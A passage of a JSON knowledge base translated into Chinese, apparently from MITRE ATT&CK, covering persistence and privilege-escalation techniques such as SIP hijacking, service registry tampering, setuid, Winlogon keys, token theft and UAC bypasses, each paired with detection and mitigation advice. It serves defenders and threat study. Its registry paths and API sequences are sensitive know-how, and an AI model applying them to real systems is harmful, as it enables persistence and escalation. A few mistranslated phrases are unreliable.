Exchange传输代理可以对通过传输管道发送的邮件进行操作来执行各种任务，例如筛选垃圾邮件、筛选恶意附件、记录日志或在所有发出电子邮件的结尾添加公司签名。传输代理可以由应用程序开发人员编写，然后编译为.NET程序集，再注册到Echange服务器上。传输代理将在邮件处理的指定阶段调用来执行开发人员定义的任务。</p><p>攻击者可能会注册恶意传输代理，在Exchange服务器上提供可由攻击者指定的邮件事件触发的持久性机制。尽管可能是为通过Exchange传输管道发送的所有电子邮件调用恶意传输代理，但可以将该代理配置为仅根据攻击者定义的标准来执行特定任务。例如，如果收件人邮件地址与攻击者地址列表中的条目相匹配，则传输代理可以执行类似复制并保存传输中的附件以待后续用于数据渗漏的操作。</p><p>SQL存储过程</p><p>SQL存储过程是可以保存并重用的代码。这样，数据库用户就不需要浪费时间重写常用的SQL查询语句。存储过程可以通过SQL语句调用到使用过程名的数据库，或是通过定义的事件（例如，SQL服务器应用程序启动或重启时）调用。攻击者可能会精心设计恶意存储过程，以便在SQL数据库服务器上提供持久性机制。若要通过SQL语法执行操作系统命令，攻击者可能必须启用其他功能，例如用于MSSQL Server的<code>xp_cmdshell</code>。</p><p>Microsoft SQL Server可以启用公共语言运行时（CLR）集成。启用CLR集成后，应用程序开发人员可以使用任何.NET框架语言（例如VB，.NET，C#）编写存储过程。攻击者可能会制作或修改链接到存储过程的CLR程序集，从而执行任意命令。</p>",
	"details": {
		"platform": ["Windows", "Linux"],
		"permissionRequired": ["管理员", "系统", "root用户"],
		"dataSources": ["文件监控", "应用日志"]
	},
	"relations": {
		"detection": "<p>监控应用程序日志来查看是否有应用程序软件组件安装的可疑行为。监控与新应用程序软件组件安装相关的文件位置，例如应用程序通常从中加载此类可扩展组件的路径。监控MSSQL Server上的xp_cmdshell使用情况。</p>",
		"mitigations": [{
			"name": "审核",
			"description": "定期检查关键服务上的组件软件来验证系统的完整性并确定是否有出乎意料的修改。攻击者可能会针对这些服务来获取持久性。"
		}, {
			"name": "代码签名",
			"description": "确保所有应用程序组件二进制文件均由正确的应用程序开发人员签名。"
		}, {
			"name": "特权账户管理",
			"description": "不允许有权在这些服务上添加组件软件的管理员账户用于日常操作，这些操作可能会将账户暴露给非特权系统上的潜在攻击者。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "服务器软件组件"
}, {
	"id": "T1058",
	"description": "<p>Windows在<code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>下的注册表中存储本地服务配置信息。攻击者可能会通过服务控制器，sc.exe，PowerShell或Reg等工具来操纵存储在服务注册表项下的信息，从而修改服务的执行参数。可通过访问控制列表和权限来控制对注册表项的访问。</p><p>如果未正确设置用户和组的权限，并允许访问服务注册表项，则攻击者可能会更改服务binPath/ImagePath以指向他们所控制的可执行文件。服务启动或重新启动时，将执行攻击者控制的程序，从而使攻击者获得持久性和/或权限升级到本地/域帐户、SYSTEM、系统、、本地服务或网络服务。</p><p>攻击者还可能会更改与服务失败参数（如<code>FailureCommand</code>）关联的注册表项，以便服务失败或故意损坏时在提升的上下文中执行这些注册表项。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "系统"],
		"dataSources": ["进程命令行参数", "服务", "Windows注册表"]
	},
	"relations": {
		"detection": "<p>服务更改反映在注册表中。对现有服务的修改不应频繁发生。如果服务二进制路径或故障参数更改为该服务非典型的值，并且与软件更新无关，则可能是由于恶意活动造成的。不应孤立地看待数据和事件，而应将其视为可能导致其他活动的一系列行为中的一部分，例如为命令与控制而建立网络连接，通过发现技术来了解环境的详细信息，以及横向移动。</p><p>也可使用Sysinternals Autoruns等工具来检测是否有旨在获得持久性的系统更改，包括列出当前的服务信息。查找与已知软件、补丁周期等不相关的服务更改。当与历史数据进行比较时，通过服务执行的可疑程序可能会显示为以前从未见过的异常进程。</p><p>监控服务修改操作相关的进程和命令行参数。带内置功能的远程访问工具可以直接与Windows API交互，在典型的系统实用程序之外执行这些功能。Windows系统管理工具（如Windows Management Instrumentation和PowerShell）也可用来更改服务，因此可能还需要配置日志功能来收集适当的数据。</p>",
		"mitigations": [{
			"name": "限制注册表权限",
			"description": "确保为注册表配置单元设置了适当的权限，以防止用户修改可能导致权限升级的系统组件的相关表项。"
		}],
		"tactics": ["TA0003", "TA0004"]
	},
	"name": "服务注册权限缺陷"
}, {
	"id": "T1166",
	"description": "<p>当在Linux或macOS上为应用程序设置setuid或setgid位时，这意味着应用程序将分别以属主用户或组的权限运行。通常，应用程序在当前用户的上下文中运行，而不管哪个用户或组拥有该应用程序。某些情况下，程序需要在提升权限的上下文中执行才能正常运行，但运行程序的用户不需要提升权限。任何用户都可以指定要为自己的应用程序设置的setuid或setgid标志，而不必在sudoers文件中以root用户权限创建。通过ls-l命令查看文件属性时，这些位用s而不是x表示。<code>chmod</code>程序可以通过以下方法来设置这些位：位掩码，chmod <code>4777 [</code><code>文件</code><code>]</code>或简化命名，<code>chmodu+s [file]</code>。</p><p>攻击者可能会利用此机会执行shell转义，或者利用应用程序中具有setsuid或setgid位的漏洞，使代码在其他用户的上下文中运行。此外，攻击者可以在自己的恶意软件上使用此机制，以确保他们将来能够在提升的上下文中执行。</p>",
	"details": {
		"platform": ["Linux", "macOS"],
		"permissionRequired": ["用户"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>监控文件系统中设置了setuid或setgid位的文件。监控实用程序（如chmod）的执行及其命令行参数，以查找正在设置的setuid或setguid位。</p>",
		"mitigations": [{
			"name": "操作系统配置",
			"description": "不要给存在漏洞或shell转义的应用程序设置setuid或setgid位，以减少应用程序受到攻击时可能遭受的损坏。此外，应在整个系统中尽量减少设置setuid或setgid位的程序数。"
		}],
		"tactics": ["TA0004", "TA0003"]
	},
	"name": "Setuid和Setgid"
}, {
	"id": "T1023",
	"description": "<p>快捷方式或符号链接是引用其他文件或程序的方式，这些文件或程序将在系统启动进程单击或执行快捷方式时打开或执行。攻击者可以使用快捷方式持续执行其工具。他们可能会创建一个新的快捷方式作为间接手段，通过伪装使其看起来像一个合法的程序。攻击者还可以编辑目标路径或完全替换现有快捷方式，以便执行他们自己的工具，而不是预期的合法程序。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户", "管理员"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>由于快捷方式的目标路径可能不会更改，因此与已知软件更改、修补程序、删除等不相关的快捷方式文件的修改可能是可疑的。分析应尝试根据已知的攻击者行为（如启动未知可执行文件的相关进程来创建网络连接），来判断快捷方式文件的更改或创建事件是否与其他潜在可疑事件相关。</p>",
		"mitigations": [{
			"name": "用户账户管理",
			"description": "将可以在Windows中创建符号链接的权限限定给适当的组，如管理员组和虚拟化所需的组。这可以在GPO的以下路径设置：计算机配置 > [策略] > Windows 设置 > 安全设置 > 本地策略 > 用户权限分配：创建符号链接。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "快捷方式修改"
}, {
	"id": "T1198",
	"description": "<p>在用户模式下，Windows Authenticode数字签名用于验证文件的来源和完整性，以及可用于在签名代码中建立信任的变量（例如：具有有效Microsoft签名的驱动程序可以视为安全程序）。签名验证过程通过WinVerifyTrust API函数处理，该函数接受查询并与负责验证签名参数的相应信任提供程序协调。</p><p>由于可执行文件类型和相应的签名格式各不相同，Microsoft创建了名为主题接口包（SIP）的软件组件，以便在API函数和文件之间提供抽象层。SIP负责使API函数能够创建、检索、计算和验证签名。大多数文件格式（可执行文件、PowerShell、安装程序等，其中目录签名提供Calk ALL）存在唯一的SIP，并且由全局唯一标识符（GUID）标识。</p><p>与代码签名类似，攻击者可能会滥用此体系结构来破坏信任控制，并绕过仅允许合法签名的代码在系统上执行的安全策略。攻击者可能会劫持SIP和信任提供程序组件，误导操作系统和白名单工具，将恶意（或任何）代码根据以下标准分类为：</p><p>·         在<code>HKLM\\SOFTWARE[\\WOW6432Node]Microsoft\\Cryptography\\OID\\EncodingType0\\CryptSIPDllGetSignedDataMsg{{SIP_GUID}}</code>下修改注册表项<code>Dll</code>和<code>FuncName</code>的值，指向提供SIP函数CryptSIPDllGetSignedDataMsg的动态链接库，该函数会从签名文件中检索编码的数字证书。通过使用始终返回已知良好签名值（例如：用于可移植可执行文件的Microsoft签名）的导出函数而非文件的实际签名来指向恶意制作的动态链接库，攻击者可以将可接受的签名值应用于使用SIP的所有文件（尽管可能会发生哈希不匹配，从而使签名无效，因为函数返回的哈希值与从文件中计算的值不匹配）。</p><p>·         在<code>HKLM\\SOFTWARE[WOW6432Node]Microsoft\\Cryptography\\OID\\EncodingType0\\CryptSIPDllVerifyIndirectData{{SIP_GUID}}</code>下修改注册表项<code>Dll</code>和<code>FuncName</code>的值，指向提供SIP函数 CryptSIPDllVerifyIndirectData的动态链接库，该函数根据签名哈希值验证文件的计算哈希值。通过使用始终返回TRUE（表示验证成功）的导出函数指向恶意制作的动态链接库，攻击者可以使用该SIP成功验证有合法签名的任何文件（无论是否劫持前面提到的CryptSIPDllGetSignedDataMsg函数）。此注册表值还可以从已存在的动态链接库重定向到适当的导出函数，从而躲避在磁盘上放置和执行新文件的要求。</p><p>·         在<code>HKLM\\SOFTWARE[WOW6432Node]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy{{trustprovider GUID}}</code>下修改注册表项<code>DLL</code>和<code>Function</code>的值，指向提供信任提供程序函数FinalPolicy的动态链接库，即检查解码和解析的签名并做出大多数信任决策的位置。与劫持SIP函数CryptSIPDllVerifyIndirectData类似，此值可以从已经存在的动态链接库或恶意制作的动态链接库重定向到适当的导出函数（尽管信任提供程序的实现很复杂）。</p><p>·         注意：通过DLL搜索顺序劫持也可以在不修改注册表的情况下进行上述劫持。</p><p>劫持SIP或信任提供程序组件还可以启用持久代码执行，因为执行代码签名或签名验证的任何应用程序都可能调用这些恶意组件。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "系统"],
		"dataSources": ["API监控", "应用日志", "动态链接库监控", "加载的动态链接库", "进程监控", "Windows注册表", "Windows事件日志"]
	},
	"relations": {
		"detection": "<p>定期对注册的SIP和信任提供程序（注册表项和磁盘上的文件）进行基线，特别是查找新的、修改的或非Microsoft 条目。</p><p>启用CryptoAPI v2（CAPI）事件日志功能，以监控和分析与失败的信任验证相关的错误事件（事件81，尽管此事件可能由被劫持的信任提供程序组件破坏），以及任何其他提供的信息事件（例如：成功验证）。代码完整性事件日志功能还可以提供恶意SIP或信任提供程序加载的重要指标，因为试图加载恶意制作的信任验证组件的受保护进程可能会失败（事件3033）。</p><p>利用Sysmon检测规则和/或启用高级安全审核策略中的注册表（全局对象访问审核）设置，对SIP和信任提供程序相关注册表项值的修改应用全局系统访问控制列表（SACL）及事件审核。</p><p>·         HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID</p><p>·         HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID</p><p>·         HKLM\\SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust</p><p>·         HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\Providers\\Trust</p><p><b>注意：</b>作为此技术的一部分，攻击者可能会尝试手动编辑这些注册表项（例如：Regedit）或使用Regsvr32的合法注册进程。</p><p>分析Autoruns数据，尤其是通过隐藏在自动启动位置来尝试持久执行的恶意文件，是否有异常数据。默认情况下，Autoruns将隐藏由Microsoft或Windows签名的条目，因此请确保取消选中\"隐藏Microsoft条目\"和\"隐藏Windows条目\"。</p>",
		"mitigations": [{
			"name": "执行预防",
			"description": "启用白名单解决方案，如AppLocker和/或设备防护，以阻止恶意SIP DLL的加载。"
		}, {
			"name": "文件和目录权限限制",
			"description": "将SIP DLL的存储和执行限制给受保护的目录，如C：\\Windows，而不是用户目录。"
		}, {
			"name": "注册表权限限制",
			"description": "确保为注册表配置单元设置了适当的权限，以防止用户修改与SIP和信任提供程序组件相关的注册表项。如果不阻止对注册表项的恶意修改，则组件仍可能被劫持到磁盘上已有的适当函数。"
		}],
		"tactics": ["TA0005", "TA0003"]
	},
	"name": "SIP和信任提供商劫持"
}, {
	"id": "T1165",
	"description": "<p>根据 Apple 的文档，启动项目在启动过程的最后阶段执行，并包含 shell 脚本或其他可执行文件，以及系统用于确定所有启动项目的执行顺序的配置信息。从技术上讲，这是一个弃用的版本（被启动守护程序取代），因此相应的文件夹，<code>/Library/StartupItems</code>在默认情况下不能保证存在于系统上，但默认情况下在 macOS Sierra 上确实存在。启动项是一个目录，其可执行和配置属性列表（plist，<code>StartupParameters.plist</code>，驻留在顶级目录中。</p><p>攻击者可以在\"启动项\"目录中创建相应的文件夹/文件，以注册其自己的持久性机制。此外，由于启动项在 macOS 的启动阶段运行，它们将作为根运行。如果攻击者能够修改现有的启动项目，那么他们也将能够权限升级。</p>",
	"details": {
		"platform": ["macOS"],
		"permissionRequired": ["管理员"],
		"dataSources": ["文件监控", "进程监控"]
	},
	"relations": {
		"detection": "<p>可以监控<code>/Library/StartupItems</code>文件夹的更改。同样，应对照白名单检查实际使用此机制执行的程序。监控启动过程中执行的进程，以检查异常或未知的应用程序和行为。</p>",
		"mitigations": [{
			"name": "文件和目录权限限制",
			"description": "由于启动项已弃用，因此阻止所有用户写入/Library/StartupItems目录将阻止任何启动项注册。"
		}, {
			"name": "用户账户管理",
			"description": "应用适当的权限，以便只有特定用户才能编辑启动项目，以便可以利用这些项目进行权限提升。"
		}],
		"tactics": ["TA0003", "TA0004"]
	},
	"name": "启动项"
}, {
	"id": "T1019",
	"description": "<p>BIOS（基本输入/输出系统）和统一可扩展固件接口（UEFI） 或可扩展固件接口（EFI） 是作为操作系统和计算机硬件之间的软件接口运行的系统固件示例。</p><p>系统固件（如 BIOS 和 （U）EFI）是计算机功能的不足，可能被攻击者修改以执行或协助恶意活动。存在覆盖系统固件的功能，这可能为复杂的对手提供安装恶意固件更新的方法，作为在系统上难以检测的持久性手段。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "系统"],
		"dataSources": ["API监控", "BIOS", "EFI"]
	},
	"relations": {
		"detection": "<p>可能检测到系统固件操作。在易受攻击的系统上转储和检查 BIOS 映像，并比较已知良好的图像。分析差异以确定是否发生了恶意更改。日志尝试读取/写入 BIOS 并比较已知的修补行为。</p><p>同样，EFI 模块可以收集，并将其与 EFI 可执行二进制文件的已知干净列表进行比较，以检测潜在的恶意模块。CHIPSEC 框架可用于分析以确定是否执行了固件修改。</p>",
		"mitigations": [{
			"name": "启动完整性",
			"description": "检查现有 BIOS 或 EFI 的完整性，以确定它是否容易受到修改。使用受信任的平台模块技术。"
		}, {
			"name": "特权账户管理",
			"description": "阻止攻击者访问特权帐户或执行此技术所需的访问权限。"
		}, {
			"name": "更新软件",
			"description": "根据需要修补 BIOS 和 EFI。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "系统固件"
}, {
	"id": "T1501",
	"description": "<p>系统服务可用于在 Linux 系统上建立持久性。系统化服务管理器通常用于管理后台守护进程（也称为服务）和其他系统资源。Systemd 是许多 Linux 发行版上的默认初始化（init） 系统，从 Debian 8、Ubuntu 15.04、CentOS 7、RHEL 7、Fedora 15 开始，并替换了旧式初始化系统，包括SysVinit 和 Upstart，同时保持向后兼容上述 init 系统。</p><p>Systemd 利用称为服务单元的配置文件来控制服务在什么条件下如何启动。默认情况下，这些单元文件存储在<code>/etc/systemd/system</code>和<code>/usr/lib/systemd/system</code>目录中，并且具有文件扩展名.service。每个服务单元文件可能包含许多指令，这些指令可以执行系统命令。</p><p>·         ExecStart，ExecStartPre,和ExecStartPost指令涵盖当服务，通过\"systemctl\"手动启动时的命令执行，或者如果服务设置为自动启动，则在系统启动时执行命令。</p><p>·         ExecReload指令涵盖服务何时重新启动。</p><p>·         ExecStop和 ExecStopPost涵盖服务通过\"系统ctl\"停止或手动停止时。</p><p>攻击者使用系统化功能，通过创建、和/或修改服务单元文件来建立对受害者系统的持久访问，这些文件会导致系统定期执行恶意命令，例如系统启动时。</p><p>虽然对手通常需要根权限才能在<code>/etc/systemd/system</code>和<code>/usr/lib/systemd/system</code>目录中创建/修改服务单元文件，但低权限用户可以在目录，如<code>~/.config/systemd/user/</code>以实现用户级持久性。</p>",
	"details": {
		"platform": ["Linux"],
		"permissionRequired": ["root用户", "用户"],
		"dataSources": ["进程命令行参数", "进程监控", "文件监控"]
	},
	"relations": {
		"detection": "<p>系统服务单元文件可以在<code>/etc/systemd/system</code>，<code>/usr/lib/systemd/system/</code>和<code>/home//.config/systemd/user/</code>目录内，通过审核文件创建和修改事件检测，以及相关的符号链接。以这种方式生成的可疑进程或脚本将具有\"systemd\"的父进程，父进程 ID 为 1，并且通常将作为\"root\"用户执行。</p><p>通过将结果与受信任的系统基线进行比较，还可以识别可疑的系统服务。通过使用 systemctl 实用程序检查系统范围的服务，可以检测到恶意的系统化服务：<code>systemctl list-units -–type=service –all</code>。分析文件系统上存在的.service文件的内容，并确保它们引用合法的、预期的可执行文件。</p><p>审核\"systemctl\"实用程序的执行和命令行参数，以及相关实用程序（如<code>/usr/sbin/service</code>）可能会显示恶意的系统服务执行。</p>",
		"mitigations": [{
			"name": "限制软件安装",
			"description": "仅将软件安装限制为受信任的存储库，并小心孤立的软件包."
		}, {
			"name": "特权账户管理",
			"description": "系统化服务单元文件的创建和修改的权限通常保留给管理员，如 Linux  root用户和其他具有超级用户权限的用户。"
		}, {
			"name": "文件和目录权限限制",
			"description": "限制对系统单元文件的读/写访问，仅选择具有管理系统服务的合法需求的特权用户。"
		}, {
			"name": "用户帐户管理",
			"description": "将用户对系统实用程序（如\"systemctl\"）的访问权限限制为只有具有合法需求的用户。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "Systemd服务"
}, {
	"id": "T1209",
	"description": "<p>W32Time（Windows时间服务）支持域间和域内的时间同步。W32Time时间提供程序负责从硬件/网络资源中检索时间戳并将这些值输出到其他网络客户端。</p><p>时间提供程序实现为<code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\</code>的子项中注册的动态链接库。</p><p>在服务控制管理器的指导下，时间提供程序管理器在系统启动时和/或在参数更改时加载并启动此项下列出并启用的时间提供程序。</p><p>攻击者可能会滥用此架构来建立持久性，特别是通过注册和启用恶意动态库来作为时间提供程序。时间提供程序需要管理员权限才能注册，但注册后可以本地服务账号权限运行。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "系统"],
		"dataSources": ["API监控", "二进制文件元数据", "动态链接库监控", "文件监控", "已加载动态链接库", "进程监控"]
	},
	"relations": {
		"detection": "<p>建立基线值并监控/分析注册表中W32Time信息修改相关的活动，包括调用API（如RegCreateKeyEx和RegSetValueEx）以及执行W32TM.exe实用程序。自定义时间提供程序注册的数量没有限制，尽管每个都可能需要将动态链接库有效负载写入磁盘。</p><p>还可以使用Sysinternals Autoruns工具来分析自动启动位置，包括列为时间提供程序的动态链接库。</p>",
		"mitigations": [{
			"name": "文件和目录权限限制",
			"description": "考虑使用组策略来配置和阻止对W32Time 动态链接库的添加/修改。"
		}, {
			"name": "注册表权限限制",
			"description": "请考虑使用组策略来配置和阻止对注册表中W32Time参数的修改。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "时间服务器"
}, {
	"id": "T1084",
	"description": "<p>WMI（Windows Management Instrumentation）可用于安装事件筛选器、提供程序、使用者和绑定，它们都在定义的事件发生时执行代码。攻击者可能会使用WMI功能来订阅事件并在事件发生时执行任意代码，从而在系统上实现持久性。攻击者可能会试图通过将WMI脚本编译到Windows管理对象（MOF）文件（扩展名为.mof）中来逃避对此技术的检测。可订阅的事件示例有挂钟时间或计算机的正常运行时间。据报道，有几个威胁组织使用这种技术来保持持久性。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "系统"],
		"dataSources": ["WMI对象"]
	},
	"relations": {
		"detection": "<p>监控WMI事件订阅条目，将当前WMI事件订阅与每个主机的已知良好订阅记录进行比较。也可使用Sysinternals Autoruns等工具来检测是否有旨在获得持久性的WMI更改。</p>",
		"mitigations": [{
			"name": "特权账号管理",
			"description": "防止管理员和特权账号在系统之间的凭据重叠。"
		}, {
			"name": "用户账号管理",
			"description": "默认情况下，只允许管理员使用WMI远程连接；限制允许连接的其他用户，或禁止所有用户远程连接到WMI。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "WMI事件订阅"
}, {
	"id": "T1004",
	"description": "<p>Winlogon.exe是Windows组件，负责登录/注销时的操作以及Ctrl-Alt-Delete触发的SAS（安全注意序列）。注册表项<code>HKLM\\Software[Wow6432Node]Microsoft\\WindowsNT\\CurrentVersion\\Winlogon\\</code>和<code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code> 用于管理支持Winlogon的其他帮助程序和功能。</p><p>对这些注册表项的恶意修改可能导致Winlogon加载和执行恶意动态链接库和/或可执行文件。具体而言，已知以下子项可能容易被滥用：</p><p>·         Winlogon\\Notify  - 指向处理Winlogon事件的通知包动态链接库</p><p>·         Winlogon\\Userinit  - 指向userinit.exe，即用户登录时执行的用户初始化程序</p><p>·         Winlogon\\Shell  - 指向explorer.exe，即用户登录时执行的系统shell</p><p>攻击者可能会利用这些功能重复执行恶意代码并建立持久性。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["管理员", "系统"],
		"dataSources": ["Windows注册表", "文件监控", "进程监控"]
	},
	"relations": {
		"detection": "<p>监控与Winlogon相关但与已知软件、补丁周期等无关的注册表项的更改。也可使用Sysinternals Autoruns等工具来检测是否有旨在获得持久性的系统更改，包括列出当前的Winlogon帮助程序值。写入与已知良性软件或补丁无关的动态链接库到System32也可能是可疑的。</p><p>查看是否有因加载恶意动态链接库而导致的异常进程行为。不应孤立地看待数据和事件，而应将其视为可能导致其他活动的一系列行为中的一部分，例如为命令与控制而建立网络连接，通过发现了解环境的详细信息，以及横向移动。</p>",
		"mitigations": [{
			"name": "执行预防",
			"description": "使用能够审核和/或阻止未知动态链接库的白名单工具来识别并阻止通过Winlogon帮助程序进程执行的潜在恶意软件。"
		}, {
			"name": "用户账号管理",
			"description": "限制用户账号的权限，使得只有授权管理员才能更改Winlogon帮助程序。"
		}],
		"tactics": ["TA0003"]
	},
	"name": "Winlogon Helper DLL"
}, {
	"id": "T1134",
	"description": "<p>Windows使用访问令牌来确定运行中进程的所有权。用户可以操纵访问令牌，使运行中的进程看起来好像属于其他人，而不是启动该进程的用户。发生这种情况时，进程也还接受与新令牌关联的安全上下文。例如，微软提倡使用访问令牌作为最佳安全实践。管理员应以标准用户身份登录，但使用内置的访问令牌操控命令<code>runas</code>以管理员权限运行工具。</p><p>攻击者可能会使用访问令牌在不同的用户或系统安全上下文下执行操作并逃避检测。攻击者可能会使用内置的Windows API函数从现有进程复制访问令牌；这也即称为令牌窃取。攻击者窃取令牌之前必须已经处于特权用户上下文（即管理员）中。攻击者通常通过令牌窃取将其安全上下文从管理员级别提升到系统级别。他们可能会使用令牌向远程系统请求身份验证为该令牌的账号（如果该账号对远程系统具有适当的权限）。</p><p><strong>攻击者可以通过三种方式利用访问令牌：</strong></p><p>令牌模拟/盗窃-攻击者使用<code>DuplicateToken(Ex)</code>复制现有令牌，创建新的访问令牌。然后，该令牌可以与<code>ImpersonateLoggedOnUser</code>一起使用以允许调用线程模拟登录用户的安全上下文，或者与<code>SetThreadToken</code>一起使用将模拟令牌分配给线程。目标用户在系统上有非网络登录会话时，这个方法非常有用。</p><p>使用令牌创建进程-攻击者使用<code>DuplicateToken(Ex)</code>创建新的访问令牌，并将其与<code>CreateProcessWithTokenW</code>一起使用，创建在模拟用户的安全上下文下运行的新进程。这个方法对于在不同用户的安全上下文中创建新进程非常有用。</p><p>生成并模拟令牌-攻击者有用户名和密码，但尚未登录到系统。攻击者可以使用<code>LogonUser</code>函数为用户创建登录会话。函数会返回新会话访问令牌的副本。攻击者可以使用<code>SetThreadToken</code>将令牌分配给线程。</p><p>任何标准用户都可以使用<code>runas</code>命令和Windows API函数来创建模拟令牌；使用此命令时不需要访问管理员账号。</p><p>Metasploit的Meterpreter负载允许任意的令牌操控，并通过令牌模拟来提升权限。Cobalt Strike beacon负载允许任意令牌模拟，也可以创建令牌。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户", "管理员"],
		"dataSources": ["API监控", "访问令牌", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>如果攻击者使用标准命令行shell，分析人员可以审核命令行活动来检测令牌操纵情况。具体来说，分析人员应该检测<code>runas</code>命令的使用。在Windows系统中，默认情况下不启用详细的命令行日志记录功能。</p><p>如果攻击者使用的是直接调用Windows令牌API的有效负载，那么分析人员只能通过仔细分析用户网络活动、检查正在运行的进程以及分析与其他端点和网络行为的相关性来检测令牌操纵情况。</p><p>有效负载可以利用多种Windows API调用来操纵访问令牌，比如<code>LogonUser</code><code>，</code><code>DuplicateTokenEx</code><code>和</code><code>ImpersonateLoggedOnUser</code>。详细信息，请参阅参考的Windows API页。</p><p>查询系统中的进程和线程令牌信息，并查找不一致情况，例如用户拥有模拟本地系统账号的进程。</p>",
		"mitigations": [{
			"name": "特权账号管理",
			"description": "限制权限，使得用户和用户组无法创建令牌。应仅为本地系统账号做此设置。GPO路径：计算机配置 > [策略] > Windows设置 > 安全设置 > 本地策略 > 用户权限分配：创建令牌对象。"
		}, {
			"name": "用户账号管理",
			"description": "攻击者必须已经在本地系统上具有管理员级别的访问权限才能充分利用此技术。请确保将用户和账号限制在其所需的最低权限范围内。"
		}],
		"tactics": ["TA0005", "TA0004"]
	},
	"name": "访问令牌操纵"
}, {
	"id": "T1088",
	"description": "<p>Windows UAC（用户账号控制）允许程序通过提示用户进行确认来提升权限以便其以管理员级别权限执行任务。对用户的影响范围由高强制下拒绝操作到允许本地管理员群组中的用户执行操作并单击提示或允许用户输入管理员密码来完成操作。</p><p>如果计算机的UAC保护级别设置为最高级别以外的任何级别，则允许某些Windows程序提升权限或执行某些已提升的COM对象，无需使用UAC通知框提示用户。例如，使用rundll32.exe加载一个特制的动态链接库（该动态链接库加载一个自动提升的COM对象），并在通常需要提升访问权限的受保护目录中执行文件操作。恶意软件也可能在不提示用户的情况下被注入到受信任的进程中来提升权限。如果目标进程不受保护，则攻击者可以使用这些技术将权限提升到管理员级别。</p><p>已经发现许多绕过UAC的方法。UACMe相关的Github readme页面包含一张大清单，列出了许多UACMe中发现和实现的方法，但该清单可能并不完整。经常也会发现其他的旁路方法，有的甚至是些旁门左道的方法，例如：</p><p>·         eventvwr.exe可以自动提升和执行指定的二进制或脚本。</p><p>如果已知具有管理员权限的账号凭据，则可能会有其它通过横向移动技术来绕过UAC的方法，因为UAC是一个单一的系统安全机制，一个系统上运行的进程的权限或完整性在横向系统上是未知的而且默认为高完整性。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户", "管理员"],
		"dataSources": ["系统调用", "进程监控", "认证日志", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>当用户在系统的本地管理员群组中时，有许多方法可以绕过UAC，因此可能很难针对所有变数来做检测。应努力减轻影响，收集足够的UAC旁路前后的进程启动和行动信息。监控进程API调用来查看是否有进程注入以及通过动态链接库搜索顺序劫持技术异常加载动态链接库的行为（这些异常行为旨在获取更高权限来访问进程）。</p><p>一些UAC旁路方法依赖于修改特定的、用户可访问的注册表设置。例如：</p><p>·         <code>eventvwr.exe</code>旁路使用注册表项<code>[HKEY_CURRENT_USER]\\Software\\Classes\\mscfile\\shell\\open\\command</code>。</p><p>·         <code>sdclt.exe</code>旁路使用注册表项<code>[HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\AppPaths\\control.exe</code>和<code>[HKEY_CURRENT_USER]\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand</code>。</p><p>分析人员应监控这些注册表设置，防止未经授权的更改。</p>",
		"mitigations": [{
			"name": "审核",
			"description": "检查Windows系统上常见的UAC旁路漏洞，了解风险状况，并适时解决问题。"
		}, {
			"name": "特权账号管理",
			"description": "从系统上的本地管理员群组中删除用户。"
		}, {
			"name": "用户账号控制",
			"description": "尽管存在UAC旁路技术，在可能的情况下对UAC使用最高强制级别并且减少需使用动态链接库搜索顺序劫持等技术的旁路机会还是很明智的。"
		}],
		"tactics": ["TA0005", "TA0004"]
	},
	"name": "UAC绕过"
}, {
	"id": "T1514",
	"description": "<p>攻击者可能会调用AuthorizationExecuteWithPrivileges API通过提示用户输入凭据的方式来提升权限。调用此API的目的是为应用程序开发人员提供一种使用root权限执行操作（例如安装或更新应用程序）的简单方法。此API不验证请求root权限的程序是否来自可靠的源或是否已被恶意修改。尽管不推荐使用此API，但它在最新版本的macOS中仍完全可用。调用此API时，将提示用户输入其凭据，但不检测程序的来源或完整性。调用此API的程序还可能会加载全局可写文件，这些文件可以修改为使用提升的权限执行恶意行为。</p><p>攻击者可能会滥用AuthorizationExecuteWithPrivileges API来获得root权限，以便在已遭入侵的系统中安装恶意软件和持久性机制。该技术可以与伪装技术结合使用，诱骗用户给恶意代码提升权限。这项技术已经证明可以修改使用此API的机器上的合法程序。</p>",
	"details": {
		"platform": ["macOS"],
		"permissionRequired": ["管理员", "用户"],
		"dataSources": ["文件监控", "进程监控", "API 监控"]
	},
	"relations": {
		"detection": "<p>监控<code>/usr/libexec/security_authtrampoline</code>执行，查看是否有调用AuthorizationExecuteWithPrivileges API的异常情况。MacOS系统日志可能会显示该API的调用时间。监控操作系统API回调也是一种检测方式，但需要专门的安全工具。</p>",
		"mitigations": [{
			"name": "执行预防",
			"description": "可通过系统设置来阻止运行未通过Apple Store下载的应用程序，这可能有助于缓解一些攻击影响。不允许运行未签名的应用程序也可以减轻一些风险。"
		}],
		"tactics": ["TA0004"]
